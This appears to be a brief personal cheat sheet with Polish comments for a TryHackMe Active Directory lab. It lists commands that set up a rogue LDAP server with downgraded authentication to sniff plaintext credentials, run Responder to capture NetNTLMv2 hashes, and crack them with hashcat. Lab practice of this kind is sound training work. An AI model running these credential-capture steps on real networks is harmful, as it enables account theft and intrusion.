nc -lvnp 389

sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
sudo dpkg-reconfigure -p low slapd
# dowolne hasło
# nie pomijać konfiguracji
# DNS i nazwa organizacji takie same np. "za.tryhackme.com"
# MDB
# purge na nie, move old na tak
sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
sudo tcpdump -SX -i breachad tcp port 389


#łapie pakiety
sudo service slapd stop
sudo responder -I breachad
hashcat -m 5600 <hash file> <password file> --force

